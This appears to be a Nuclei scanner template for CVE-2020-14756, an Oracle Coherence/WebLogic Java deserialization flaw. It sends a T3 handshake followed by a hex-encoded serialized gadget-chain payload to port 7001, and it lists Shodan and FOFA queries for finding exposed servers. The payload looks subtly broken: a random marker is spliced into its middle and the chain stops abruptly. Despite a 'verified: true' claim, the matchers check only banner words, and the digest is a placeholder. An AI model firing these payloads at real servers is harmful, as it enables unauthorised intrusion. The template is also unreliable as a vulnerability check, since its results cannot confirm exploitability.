id: CVE-2020-14756

info:
  name: Oracle Coherence - Remote Code Execution via T3/IIOP Deserialization
  author: princechaddha
  severity: critical
  description: |
    Oracle Coherence component of Oracle Fusion Middleware (versions 3.7.1.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0) is vulnerable to remote code execution. An unauthenticated attacker with network access via T3 or IIOP can exploit insecure deserialization in ExternalizableHelper to execute arbitrary code.
  impact: |
    Successful exploitation allows unauthenticated attackers to completely compromise the Oracle WebLogic Server, potentially leading to full system takeover, data theft, and lateral movement within the network.
  remediation: |
    Apply Oracle Critical Patch Update (January 2021 or later). Alternatively, disable T3 and IIOP protocols if not required, or restrict network access to these ports.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2020-14756
    - https://www.oracle.com/security-alerts/cpujan2021.html
    - https://github.com/Y4er/CVE-2020-14756
    - https://bounty-team.github.io/vulnerability%20analysis/2021/01/27/CVE-2020-14756/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2020-14756
    cwe-id: CWE-502
    epss-score: 0.97435
    epss-percentile: 0.99954
    cpe: cpe:2.3:a:oracle:coherence:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: oracle
    product: coherence
    shodan-query: "WebLogic"
    fofa-query: app="Oracle-WebLogic-Server"
  tags: cve2020,cve,oracle,weblogic,coherence,rce,deserialization,network,t3,iiop,kev

variables:
  marker: "{{rand_base(8)}}"

tcp:
  - inputs:
      - data: "t3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://{{Hostname}}:{{Port}}\n\n"
        read-size: 2048
      - data: |
          {{hex_decode('000009f30165010101ffffffffffffffff00000071000000180000001843c6a2a63985b5af7d63e64383f42a6d92c9e9af0f9472027973720078720178720278700000000c00000002000000000000000000000000017070707070700000000c0000000200000000000000000000000001007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f526581f4f9ed0c0000787072002477656c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200094900056d616a6f724900056d696e6f7249000b706174636855706461746549000c726f6c6c696e675061746368490008736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372003b636f6d2e74616e676f736f6c2e636f686572656e63652e736572766c65742e417474726962757465486f6c6465720000000000000001020002490006765f6e4964784c00076d5f6f41747472740012')}}{{marker}}{{hex_decode('4c6a6176612f6c616e672f4f626a6563743b78700000000073720040636f6d2e74616e676f736f6c2e7574696c2e6167677265676174696f722e546f704e416767726567746f72245061727469616c526573756c74000000000000000102000149000b6d5f634d6178456e747279787200236a6176612e7574696c2e5472656553657424536f727465644261674164617074657200000000000000010200034c000a6d5f636f6d70617261746f727400164c6a6176612f7574696c2f436f6d70617261746f723b4c0006736f757263657400194c6a6176612f7574696c2f536f727465644d61703b5b00076d5f7461626c657400135b4c6a6176612f6c616e672f4f626a6563743b787073720039636f6d2e74616e676f736f6c2e636f686572656e63652e726573742e7574696c2e657874726163746f722e4d76656c457874726163746f72000000000000000102000149000b6d5f6e54617267657473')}}
    host:
      - "{{Hostname}}"
    port: 7001
    read-size: 4096

    matchers-condition: and
    matchers:
      - type: word
        part: raw
        words:
          - "HELO"
        condition: and

      - type: word
        part: raw
        words:
          - "weblogic"
          - "Coherence"
        condition: or

    extractors:
      - type: regex
        name: version
        part: raw
        group: 1
        regex:
          - "HELO:([0-9.]+)"

  - inputs:
      - data: "{{hex_decode('47494f50010200030000001700000002000000000000000b4e616d6553657276696365')}}"
        read-size: 2048
    host:
      - "{{Hostname}}"
    port: 7001
    read-size: 4096

    matchers-condition: and
    matchers:
      - type: word
        part: raw
        words:
          - "GIOP"

      - type: word
        part: raw
        words:
          - "weblogic"
          - "Coherence"
        condition: or

    extractors:
      - type: regex
        name: iiop_response
        part: raw
        group: 0
        regex:
          - "GIOP.*"

# digest: placeholder
